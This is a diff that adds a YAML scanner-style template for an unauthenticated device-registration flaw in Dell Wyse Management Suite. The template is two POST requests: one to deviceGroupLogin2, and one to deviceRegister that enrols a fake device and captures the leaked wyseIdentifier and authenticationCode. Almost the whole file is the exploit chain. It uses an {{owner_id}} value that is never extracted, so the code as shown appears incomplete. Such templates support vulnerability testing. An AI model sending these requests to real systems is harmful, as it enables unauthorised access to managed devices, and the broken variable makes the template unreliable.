@@ -1,0 +1,39 @@
+id: wyse-devicegroup-register
+brief:
+    title: Dell Wyse Management Suite - Unauthenticated Device Registration
+    by: DhiyaneshDK
+    level: high
+    about: Dell Wyse Management Suite allows unauthenticated device registration by chaining deviceGroupLogin2 and deviceRegister endpoints, leaking wyseIdentifier and authenticationCode.
+    label:
+        - dell
+        - wyse
+        - auth-bypass
+        - misconfig
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/ccm-web/open/deviceGroupLogin2'
+      head:
+        Content-Type: application/json; charset=UTF-8
+        User-Agent: RMA
+      body: '{}'
+      signs:
+        - "on": word
+          has:
+            - '"isActive":true'
+          in: body
+    - verb: POST
+      to:
+        - '{{BaseURL}}/ccm-web/open/deviceRegister'
+      head:
+        Content-Type: application/json; charset=UTF-8
+        User-Agent: RMA
+        X-Stratus-device-owner-id: '{{owner_id}}'
+      body: '{"deviceType":{"type":81},"owner":{"id":{{owner_id}}},"macAddress":"ff:ff:ff:ff:ff:ff"}'
+      signs:
+        - "on": word
+          has:
+            - '"authenticationCode":'
+            - '"wyseIdentifier"'
+          in: body
+          need: all
